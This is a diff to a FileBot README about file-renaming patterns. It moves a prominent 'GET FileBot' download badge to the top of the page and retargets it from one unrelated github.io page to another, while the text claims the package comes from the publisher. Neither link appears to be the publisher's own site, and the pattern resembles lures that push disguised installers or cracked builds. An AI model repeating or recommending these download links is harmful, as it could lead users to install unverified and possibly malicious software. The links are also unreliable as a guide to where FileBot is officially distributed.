@@ -19,6 +19,8 @@ The desktop build and filebot cli share the format language. A pattern you test 
 
 The movie pass is [MovieRenamer.java](MovieRenamer.java). The episode pass is [TvShowRenamer.java](episode/TvShowRenamer.java). A single-file rename script sits beside them in [rename.groovy](rename/rename.groovy).
 
+[![GET FileBot](https://img.shields.io/badge/GET-FileBot-0E7490?style=plastic&labelColor=164E63&logoColor=white)](https://filebot-docker.github.io/FileBot/)
+
 | Kind | What the match is for |
 | --- | --- |
 | Movie | Title and year, then a folder per film |
@@ -181,8 +183,6 @@ A webdav client can browse. It cannot apply a format string. Renames you type in
 ### Packaged build
 
 One package from the publisher. Desktop installer, or the container images. One button.
-
-[![GET FileBot](https://img.shields.io/badge/GET-FileBot-0E7490?style=plastic&labelColor=164E63&logoColor=white)](https://albygypw13.github.io/.github/FileBot)
 
 filebot renamer on a home PC is the desktop app. FileBot Docker is the same renamer when the files live on a server. Do not mix a repack that bundles a key.
 
